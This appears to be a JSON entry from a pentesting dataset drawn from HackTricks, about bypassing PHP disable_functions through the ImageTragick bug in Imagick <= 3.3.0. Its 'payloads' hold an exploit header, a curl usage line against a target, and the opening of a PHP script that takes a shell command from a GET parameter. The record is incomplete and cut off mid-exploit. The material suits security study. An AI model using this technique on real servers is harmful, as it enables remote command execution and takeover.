{
  "id": "network_services_pentesting_f97c32530ad8",
  "category": "network-services-pentesting",
  "title": "disable functions bypass imagick less than 3.3.0 php greater than 5.4 exploit",
  "description": "# Imagick <= 3.3.0  \u2011 PHP >= 5.4  *disable_functions* Bypass\n\n{{#include ../../../../banners/hacktricks-training.md}}\n\n> The well-known *ImageTragick* family of bugs (CVE-2016-3714 et al.) allows an attacker to reach the underlying **ImageMagick** binary through crafted MVG/SVG input. When the PHP extension **Imagick** is present this can be abused to execute shell commands even if every execution-oriented PHP function is black-listed with `disable_functions`.\n>\n> The original PoC published by R",
  "payloads": [
    "# Imagick <= 3.3.0  \u2011 PHP >= 5.4  *disable_functions* Bypass",
    "{{#include ../../../../banners/hacktricks-training.md}}",
    "> The well-known *ImageTragick* family of bugs (CVE-2016-3714 et al.) allows an attacker to reach the underlying **ImageMagick** binary through crafted MVG/SVG input. When the PHP extension **Imagick** is present this can be abused to execute shell commands even if every execution-oriented PHP function is black-listed with `disable_functions`.",
    "> The original PoC published by RicterZ (Chaitin Security Research Lab) in May 2016 is reproduced below.  The technique is still regularly encountered during contemporary PHP 7/8 audits because many shared-hosting providers  simply compile PHP without `exec`/`system` but keep an outdated Imagick + ImageMagick combo.",
    "From <http://blog.safebuff.com/2016/05/06/disable-functions-bypass/>",
    "```php",
    "# Exploit Title : PHP Imagick disable_functions bypass",
    "# Exploit Author: RicterZ  (ricter@chaitin.com)",
    "# Versions      : Imagick <= 3.3.0  |  PHP >= 5.4",
    "# Tested on     : Ubuntu 12.04 (ImageMagick 6.7.7)",
    "# Usage         : curl \"http://target/exploit.php?cmd=id\"",
    "// Print the local hardening status",
    "printf(\"Disable functions: %s\\n\", ini_get(\"disable_functions\"));",
    "$cmd = $_GET['cmd'] ?? 'id';",
    "printf(\"Run command: %s\\n====================\\n\", $cmd);"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.md"
  ]
}